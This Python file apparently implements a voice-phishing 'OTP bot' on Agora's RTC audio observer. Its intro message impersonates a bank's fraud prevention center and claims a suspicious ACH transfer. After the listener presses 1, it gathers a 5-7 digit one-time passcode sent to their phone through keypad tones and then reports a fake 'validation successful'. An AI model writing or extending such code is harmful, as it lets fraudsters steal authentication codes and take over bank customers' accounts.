from agora.rtc.audio_frame_observer import IAudioFrameObserver, AudioFrame
from pydtmf import DTMFDecoder
import time

class AudioProcessor(IAudioFrameObserver):
    def __init__(self):
        self.decoder = DTMFDecoder(sample_rate=8000)
        self.played_intro = False  # Flag to check if intro message has been played
        self.awaiting_otp = False  # Flag to indicate if the bot is awaiting OTP input
        self.otp_digits = []  # List to store the digits of the OTP

    def on_record_audio_frame(self, frame: AudioFrame):
        # Check if the intro message has been played
        if not self.played_intro:
            self.play_intro_message()
            self.played_intro = True
        
        # Decode the audio frame for DTMF tones
        dtmf_tone = self.decoder.decode(frame.samples)
        if dtmf_tone:
            print(f"Detected DTMF tone: {dtmf_tone}")
            self.handle_dtmf_input(dtmf_tone)
        return True

    def play_intro_message(self):
        # Simulate playing an intro message
        print("Hello, this is the JayP Morgan Fraud Prevention Center.")
        print("It seems the number connected to your account is under investigation for an ACH transfer that is potentially fraudulent.")
        print("Press 1 if this was a fraudulent transaction.")
        print("Press 2 if you authorized this transaction.")
        
        # Here, you would actually play the message through your Agora channel
        # For example, via Agora's voice API (using `agora_rtc` functions)
        time.sleep(5)  # Simulate a 5-second delay while the message is being "played"

    def handle_dtmf_input(self, tone):
        if self.awaiting_otp:
            # If we are awaiting OTP input, append the digits to the OTP list
            if tone.isdigit():
                self.otp_digits.append(tone)
                print(f"Collected OTP digit: {tone}")
                
                # If we've collected 5-7 digits, process the OTP
                if 5 <= len(self.otp_digits) <= 7:
                    otp = ''.join(self.otp_digits)
                    print(f"Received OTP: {otp}")
                    self.process_otp(otp)
                    self.otp_digits = []  # Clear the OTP digits
                    self.awaiting_otp = False  # Reset the awaiting OTP flag
        else:
            # Handle initial DTMF input (press 1 or 2)
            if tone == '1':
                print("Okay, before we start, we need to verify your identity. Please repeat or type the OTP code we've sent to your phone.")
                self.awaiting_otp = True  # Start awaiting OTP input
                print("Please enter your 5-7 digit OTP code.")
            elif tone == '2':
                print("Redirecting to support.")
            else:
                print(f"Unknown DTMF input: {tone}")

    def process_otp(self, otp):
        # Simulate processing the OTP, such as validating it
        print(f"Processing OTP: {otp}")
        # Here, you can add the logic to validate the OTP
        # For example, compare it against a stored value or send it to an external service
        print("OTP validation successful.")
